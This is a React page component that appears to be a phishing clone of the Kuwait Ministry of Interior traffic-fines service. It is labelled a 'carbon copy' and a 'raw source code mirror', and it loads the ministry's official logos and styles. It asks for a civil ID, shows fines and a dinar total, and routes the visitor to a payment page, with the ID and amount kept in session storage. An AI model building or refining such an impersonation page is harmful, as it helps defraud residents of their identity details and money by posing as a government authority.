import React, { useState, useEffect } from 'react';
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { useToast } from "@/hooks/use-toast";

export default function Home() {
  const [, setLocation] = useLocation();
  const { toast } = useToast();
  const [civilId, setCivilId] = useState("");
  const [enquiryType, setEnquiryType] = useState("1");
  const [results, setResults] = useState<any>(null);
  const [isSearching, setIsSearching] = useState(false);

  const queryMutation = trpc.fines.query.useMutation({
    onSuccess: (data) => {
      setIsSearching(false);
      if (data.success) {
        setResults(data);
        toast({ title: "تم جلب البيانات", description: `تم العثور على ${data.fines.length} مخالفات` });
      } else {
        toast({ variant: "destructive", title: "خطأ", description: data.errorMessage || "فشل الاستعلام" });
      }
    },
    onError: (err) => {
      setIsSearching(false);
      toast({ variant: "destructive", title: "خطأ", description: err.message });
    }
  });

  const handleInquire = () => {
    if (civilId.length < 8) {
      toast({ variant: "destructive", description: "يرجى إدخال الرقم المدني بشكل صحيح" });
      return;
    }
    setIsSearching(true);
    queryMutation.mutate({ civilId, enquiryType: enquiryType as "1" | "2", lang: "ar" });
  };

  const handlePay = () => {
    if (!results) return;
    sessionStorage.setItem("paymentData", JSON.stringify({
      selectedFines: results.fines,
      totalAmount: results.totalAmount,
      civilId: civilId
    }));
    setLocation("/payment");
  };

  useEffect(() => {
    const interval = setInterval(() => {
      const input = document.getElementById('civilId') as HTMLInputElement;
      const select = document.getElementById('enquiryType') as HTMLSelectElement;
      const btn = document.getElementById('btnEnquire');

      if (input && !input.dataset.bound) {
        input.oninput = (e) => setCivilId((e.target as HTMLInputElement).value);
        input.dataset.bound = "true";
      }
      if (select && !select.dataset.bound) {
        select.onchange = (e) => setEnquiryType((e.target as HTMLSelectElement).value);
        select.dataset.bound = "true";
      }
      if (btn && !btn.dataset.bound) {
        btn.onclick = (e) => {
          e.preventDefault();
          handleInquire();
        };
        btn.dataset.bound = "true";
      }
    }, 500);

    return () => clearInterval(interval);
  }, [civilId, enquiryType, results]);

  return (
    <div className="moi-carbon-copy" dir="rtl">
      <style>{`
        .moi-carbon-copy { background-color: #e9e6de; min-height: 100vh; }
        .results-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.6); display: flex; justify-content: center; align-items: center; z-index: 10000; }
        .results-card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 10px 40px rgba(0,0,0,0.3); width: 90%; max-width: 450px; text-align: center; border: 4px solid #000576; }
        .loading-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.5); display: flex; justify-content: center; align-items: center; z-index: 10001; }
      `}</style>

      {/* 100% RAW SOURCE CODE MIRROR FROM MOI.GOV.KW */}
      <div dangerouslySetInnerHTML={{ __html: `
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
        <link rel="stylesheet" href="https://www.moi.gov.kw/main/css/site.css?v=go_4IccMhw1NChPOSH_W7AbpThLoN7-zMHFe4trNRE0">
        <link rel="stylesheet" href="https://www.moi.gov.kw/main/lib/fontawesome/v7/css/all.css">
        
        <div class="container" style="background-image: url('https://www.moi.gov.kw/main/images/assets/common/bg-pattern.png'); background-repeat: repeat; min-height: 100vh;">
          <header>
            <div class="row pt-3">
              <div class="col-4 col-md-2 text-center">
                <a class="navbar-brand m-0" href="#"><img src="https://www.moi.gov.kw/main/images/assets/common/ar/logo-moi.svg" style="height: 120px;"></a>
              </div>
              <div class="col-8 col-md-10 align-self-center text-right">
                <div class="row"><div class="col text-right"><img src="https://www.moi.gov.kw/main/images/assets/common/ar/state-of-kuwait.svg" style="height: 40px;"></div></div>
                <div class="row mt-2"><div class="col text-right"><img src="https://www.moi.gov.kw/main/images/assets/common/ar/ministry-of-interior.svg" style="height: 30px;"></div></div>
              </div>
            </div>
          </header>

          <nav class="navbar navbar-expand-lg navbar-dark border-bottom box-shadow mt-3" style="background-color: #000576;">
            <div class="container">
              <div class="navbar-collapse collapse show">
                <ul class="navbar-nav ml-auto">
                  <li class="nav-item active"><a class="nav-link" href="#">الرئيسيــة</a></li>
                  <li class="nav-item"><a class="nav-link" href="#">الخدمات الإلكترونيـة</a></li>
                  <li class="nav-item"><a class="nav-link" href="#">إدارات توعوية</a></li>
                  <li class="nav-item"><a class="nav-link" href="#">الإصدارات الإلكترونية</a></li>
                  <li class="nav-item"><a class="nav-link" href="#">التحقق من الوثائق</a></li>
                  <li class="nav-item"><a class="nav-link" href="#">يهمنا رايك</a></li>
                  <li class="nav-item"><a class="nav-link" href="#">أرقام الطوارئ</a></li>
                  <li class="nav-item"><a class="nav-link" href="#">منصة المواعيد</a></li>
                </ul>
              </div>
            </div>
          </nav>

          <div class="row mt-4">
            <div class="col-lg-3 d-none d-lg-block">
              <div class="list-group shadow-sm">
                <div class="p-3 text-center text-white font-weight-bold" style="background-color: #000576;">الإدارة العامة للمرور</div>
                <a href="#" class="list-group-item list-group-item-action d-flex justify-content-between align-items-center">
                  الخدمات الالكترونية لرخص السوق
                  <img src="https://www.moi.gov.kw/main/images/assets/general-traffic/ico-renew-license.svg" style="width: 24px;">
                </a>
                <a href="#" class="list-group-item list-group-item-action active d-flex justify-content-between align-items-center" style="background-color: #000576; border-color: #000576;">
                  دفع المخالفات
                  <img src="https://www.moi.gov.kw/main/images/assets/common/ico-payment.svg" style="width: 24px; filter: brightness(0) invert(1);">
                </a>
                <a href="#" class="list-group-item list-group-item-action d-flex justify-content-between align-items-center">
                  نظام مواعيد اختبار القيادة
                  <img src="https://www.moi.gov.kw/main/images/assets/general-traffic/ico-booking.svg" style="width: 24px;">
                </a>
                <a href="#" class="list-group-item list-group-item-action d-flex justify-content-between align-items-center">
                  معاملات المرور
                  <img src="https://www.moi.gov.kw/main/images/assets/general-traffic/ico-procedures.svg" style="width: 24px;">
                </a>
                <a href="#" class="list-group-item list-group-item-action d-flex justify-content-between align-items-center">
                  مواقع الإدارة العامة للمرور
                  <img src="https://www.moi.gov.kw/main/images/assets/general-traffic/ico-locations-sections.svg" style="width: 24px;">
                </a>
                <a href="#" class="list-group-item list-group-item-action d-flex justify-content-between align-items-center">
                  شروط منح رخص السوق لغير الكويتيين
                  <img src="https://www.moi.gov.kw/main/images/assets/common/ico-pdf-doc.svg" style="width: 24px;">
                </a>
              </div>
            </div>

            <div class="col-lg-9">
              <div class="card p-4 shadow-sm" style="border-radius: 0; border: none; background: rgba(255,255,255,0.85);">
                <div class="text-center mb-4">
                  <img src="https://www.moi.gov.kw/main/images/assets/general-traffic/logo-general-traffic.svg" style="height: 100px;">
                  <h3 class="mt-3" style="color: #000576; font-weight: bold;">الإدارة العامة للمرور</h3>
                  <img src="https://www.moi.gov.kw/main/images/assets/common/ico-horizontal-bar.svg" class="mt-2" style="width: 60%;">
                </div>

                <div class="form-group text-right">
                  <label class="font-weight-bold" style="color: #000576;">Enquiry Type</label>
                  <select id="enquiryType" class="form-control">
                    <option value="1">الأفراد</option>
                    <option value="2">الشركات</option>
                  </select>
                </div>

                <div class="form-group text-right">
                  <label class="font-weight-bold" style="color: #000576;">الرقم المدني أو الرقم الموحد</label>
                  <input type="text" id="civilId" class="form-control text-right" placeholder="أدخل الرقم المدني">
                </div>

                <button id="btnEnquire" class="btn btn-primary btn-block font-weight-bold mt-4" style="background-color: #000576; border: none; height: 55px; font-size: 20px;">إستعلم</button>
                
                <p class="text-center mt-4 font-weight-bold" style="color: #333;">
                  بعد إجراء عملية الدفع.. يرجى عدم محاولة الدفع مرة أخرى حيث يجرى تحديث البيانات خلال 15 دقيقة
                </p>

                <div class="d-flex justify-content-center mt-3">
                  <span class="badge badge-success p-2 mx-2">قابلة للدفع الكترونياً</span>
                  <span class="badge badge-danger p-2 mx-2">غير قابلة للدفع الكترونياً</span>
                </div>
              </div>

              <div class="row mt-4">
                <div class="col-md-4 mb-4">
                  <div class="card p-3 text-center shadow-sm" style="border-radius: 10px; border: none;">
                    <img src="https://www.moi.gov.kw/main/images/assets/common/ico-payment.svg" class="mx-auto" style="width: 50px;">
                    <h6 class="mt-3 font-weight-bold" style="color: #000576;">دفع المخالفات والغرامات</h6>
                    <button class="btn btn-outline-primary btn-sm mt-2">دفع</button>
                  </div>
                </div>
                <div class="col-md-4 mb-4">
                  <div class="card p-3 text-center shadow-sm" style="border-radius: 10px; border: none;">
                    <img src="https://www.moi.gov.kw/main/images/assets/common/ico-get-ref-num.svg" class="mx-auto" style="width: 50px;">
                    <h6 class="mt-3 font-weight-bold" style="color: #000576;">الإستعلام عن رقم مرجع الداخلية</h6>
                    <div class="d-flex gap-2 mt-2">
                      <button class="btn btn-outline-primary btn-sm flex-grow-1">للكويتين</button>
                      <button class="btn btn-outline-primary btn-sm flex-grow-1">للمقيمين</button>
                    </div>
                  </div>
                </div>
                <div class="col-md-4 mb-4">
                  <div class="card p-3 text-center shadow-sm" style="border-radius: 10px; border: none;">
                    <img src="https://www.moi.gov.kw/main/images/assets/common/ico-case-track.svg" class="mx-auto" style="width: 50px;">
                    <h6 class="mt-3 font-weight-bold" style="color: #000576;">الاستعلام عن سير القضية</h6>
                    <button class="btn btn-outline-primary btn-sm mt-2">استعلم</button>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <footer class="container border-top footer text-muted mt-2 p-0" style="background-color: #000576;">
            <div class="col-sm-12 text-center text-white mt-2 py-3" style="background-color: #000576;">
              <div class="row">
                <div class="col-sm-12">
                  <a href="https://www.youtube.com/user/SecurityMediaQ8">
                    <img src="https://www.moi.gov.kw/main/images/assets/social-media/ico-youtube.svg" class="social-media-icon" />
                  </a>
                  <a href="https://www.instagram.com/moi_kuw/?hl=en">
                    <img src="https://www.moi.gov.kw/main/images/assets/social-media/ico-instagram.svg" class="social-media-icon" />
                  </a>
                  <a href="https://twitter.com/moi_kuw?lang=en">
                    <img src="https://www.moi.gov.kw/main/images/assets/social-media/ico-twitter.svg" class="social-media-icon" />
                  </a>
                  <a href="https://www.facebook.com/MOIKuwait/">
                    <img src="https://www.moi.gov.kw/main/images/assets/social-media/ico-facebook.svg" class="social-media-icon" />
                  </a>
                  &nbsp;&nbsp;
                  <a href="https://play.google.com/store/apps/details?id=com.MoIKuwait">
                    <img src="https://www.moi.gov.kw/main/images/assets/common/ico-android.svg" class="social-media-icon" />
                  </a>
                  &nbsp;&nbsp;
                  <a href="https://itunes.apple.com/kw/app/moi-kuwait/id871764188?mt=8">
                    <img src="https://www.moi.gov.kw/main/images/assets/common/ico-apple.svg" class="social-media-icon" />
                  </a>
                </div>
              </div>
              <div class="row">
                <div class="col-sm-12">
                  © جميع الحقوق محفوظة لوزارة الداخلية-دولة الكويت - 2026
                </div>
              </div>
            </div>
          </footer>
        </div>
      ` }} />

      {isSearching && (
        <div className="loading-overlay">
          <div className="spinner-border text-white" role="status"></div>
        </div>
      )}

      {results && (
        <div className="results-overlay">
          <div className="results-card">
            <h4 className="font-weight-bold mb-4" style={{color: '#000576'}}>نتائج الاستعلام</h4>
            <div className="text-right mb-4">
              <p><strong>الرقم المدني:</strong> {civilId}</p>
              <p><strong>عدد المخالفات:</strong> {results.fines.length}</p>
              <p><strong>الإجمالي:</strong> <span className="text-danger font-weight-bold" style={{fontSize: '24px'}}>{results.totalAmount} د.ك</span></p>
            </div>
            <div className="d-flex gap-2">
              <button className="btn btn-primary flex-grow-1 font-weight-bold" style={{backgroundColor: '#000576', height: '50px'}} onClick={handlePay}>دفع الآن</button>
              <button className="btn btn-secondary flex-grow-1 font-weight-bold" style={{height: '50px'}} onClick={() => setResults(null)}>إغلاق</button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
